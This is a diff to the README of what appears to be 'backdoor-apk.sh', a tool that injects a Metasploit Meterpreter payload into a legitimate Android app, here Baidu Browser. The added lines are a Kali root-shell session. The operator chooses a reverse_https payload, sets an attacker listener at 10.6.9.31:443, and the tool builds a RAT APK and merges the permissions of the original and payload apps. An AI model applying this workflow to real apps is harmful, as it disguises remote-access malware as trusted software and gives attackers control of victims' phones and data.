@@ -5,9 +5,31 @@ Usage:
 
 ```
 root@kali:~/Android/evol-lab/BaiduBrowserRat# ./backdoor-apk.sh BaiduBrowser.apk 
+          ________
+         / ______ \
+         || _  _ ||
+         ||| || |||          AAAAAA      PPPPPPP    KKK  KKK
+         |||_||_|||         AAA  AAA     PPP  PPP   KKK KKK
+         || _  _o|| (o)    AAAA  AAAA    PPP  PPPP  KKKKKK
+         ||| || |||       AAAAAAAAAAAA   PPPPPPPP   KKK KKK
+         |||_||_|||      AAAA      AAAA  PPPP       KKK  KKK
+         ||______||     AAAA        AAAA PPPP       KKK  KKKK
+        /__________\
+________|__________|__________________________________________
+       /____________\
+       |____________|             Dana James Traversie
+
+[*] Running backdoor-apk.sh v0.1.4 on Tue Sep 20 12:00:24 EDT 2016
+[+] Android payload options:
+1) meterpreter/reverse_http   4) shell/reverse_http
+2) meterpreter/reverse_https  5) shell/reverse_https
+3) meterpreter/reverse_tcp    6) shell/reverse_tcp
+[?] Please select an Android payload option: 2
+[?] Please enter an LHOST value: 10.6.9.31
+[?] Please enter an LPORT value: 443
 [*] Generating RAT APK file...done.
-[+] Using payload: android/meterpreter/reverse_tcp
-[+] Handle the reverse connection at: 10.6.9.31:1337
+[+] Using payload: android/meterpreter/reverse_https
+[+] Handle the reverse connection at: 10.6.9.31:443
 [*] Decompiling RAT APK file...done.
 [*] Decompiling original APK file...done.
 [*] Merging permissions of original and payload projects...done.
